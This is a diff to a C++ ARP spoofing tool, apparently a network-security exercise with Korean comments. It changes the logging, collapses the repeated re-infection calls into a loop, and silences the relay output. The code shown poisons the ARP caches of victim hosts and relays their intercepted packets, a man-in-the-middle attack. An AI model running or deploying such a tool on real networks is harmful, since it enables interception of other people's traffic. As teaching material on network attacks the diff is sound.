@@ -18,7 +18,7 @@ struct EthArpPacket final {
 
 void usage() {
 	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
-	printf("sample : arp-spoof enp6s0 192.168.200.163 192.168.200.254\n");
+	printf("sample : arp-spoof enp6s0 192.168.200.163 192.168.200.254 192.168.200.254 192.168.200.163\n");
 }
 
 struct Flow {
@@ -200,7 +200,7 @@ int main(int argc, char* argv[]) {
 		if (now - lastInfect >= 10) {
 			for (const Flow& flow : flows)
 				infect(pcap, attackerMac, flow);
-			printf("periodic re-infect\n");
+			printf("[DEBUG] periodic re-infect\n");
 			lastInfect = now;
 		}
 
@@ -222,14 +222,10 @@ int main(int argc, char* argv[]) {
 				bool fromTarget = (arpHdr->sip() == flow.targetIp && arpHdr->tip() == flow.senderIp); // Target이 Sender에게 보내는 ARP 패킷
 				bool fromSender = (arpHdr->sip() == flow.senderIp && arpHdr->tip() == flow.targetIp); // Sender가 브로드캐스트로 Target을 찾는 ARP Request
 				if (fromTarget || fromSender) {
-					printf("%s > recover detected, re-infecting\n", std::string(flow.senderIp).c_str());
-					// Target의 정상 ARP Reply보다 늦게 도착해야 덮어쓸 수 있으므로
-					// 시간 간격을 두고 여러 번 전송
-					infect(pcap, attackerMac, flow);
-					usleep(100000);
-					infect(pcap, attackerMac, flow);
-					usleep(100000);
-					infect(pcap, attackerMac, flow);
+					printf("[DEBUG] %s > recover detected, re-infecting\n", std::string(flow.senderIp).c_str());
+					// 라우터의 정상 ARP Reply보다 늦게 도착할 수 있도록 여러 번 전송
+					for (int j = 0; j < 3; j++)
+						infect(pcap, attackerMac, flow);
 					break;
 				}
 			}
@@ -251,7 +247,7 @@ int main(int argc, char* argv[]) {
 			relayEth->dmac_ = flow.targetMac; // dmac은 라우터 MAC 주소
 
 			pcap_sendpacket(pcap, relayPkt, header->caplen);
-			printf("%s > relay %d bytes\n", std::string(flow.senderIp).c_str(), header->caplen);
+			// printf("%s > relay %d bytes\n", std::string(flow.senderIp).c_str(), header->caplen);
 			break;
 		}
 	}
